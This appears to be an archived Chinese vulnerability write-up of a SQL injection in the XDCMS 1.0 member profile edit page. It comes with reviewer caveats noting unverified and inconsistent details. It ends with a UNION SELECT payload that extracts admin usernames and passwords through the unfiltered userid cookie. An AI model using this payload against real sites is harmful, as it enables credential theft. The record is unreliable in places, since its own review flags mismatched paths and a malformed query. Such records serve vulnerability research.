---
source: "hatch 补库批 20260928"
product: "XDCMS1.0 memberprofile"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "XDCMS 1.0 sql注入漏洞（二）"
prerequisites: "来源所述条件，未列明部分仍待核：profileeditroute;useridcookiedirectSQL;roleandtableprefixnotstated"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-89d608670bb00ab7687bea9f"
entity_id: "ve-89d608670bb00ab7687bea9f"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：profileeditroute;useridcookiedirectSQL;roleandtableprefixnotstated

- **结论使用边界（1）**：SQL写where 'userid'=-4将列名写成字符串字面量，需核实际源码/引号而非照抄。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（2）**：只有结果SQL没有对应Cookie完整请求，固定c_admin/15列需版本/schema。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **结论使用边界（3）**：路径system/modules/member与602/modules/member不一致需源码核。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：图片后重复尾路径，缺来源/修复；和601同入口但SQLi与IDOR独立。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# XDCMS 1.0 sql注入漏洞（二）

一、漏洞简介
------------

二、漏洞影响
------------

XDCMS 1.0

三、复现过程
------------

漏洞存在于用户资料修改页面，URL：`index.php?m=member&f=edit`

![](./.resource/XDCMS1.0sql注入漏洞二/media/rId24.jpg)/media/rId24.jpg)

漏洞文件位于`system/modules/member/index.php`，`line:178`

![](./.resource/XDCMS1.0sql注入漏洞二/media/rId25.jpg)/media/rId25.jpg)

\$userid直接从Cookie中取出，并无任何过滤，导致注入

![](./.resource/XDCMS1.0sql注入漏洞二/media/rId26.jpg)/media/rId26.jpg)

    select * from table_member where 'userid'=-4 Union seLect 1,2,username,4,5,6,7,8,9,10,11,12,password,14,15 fRom c_admin
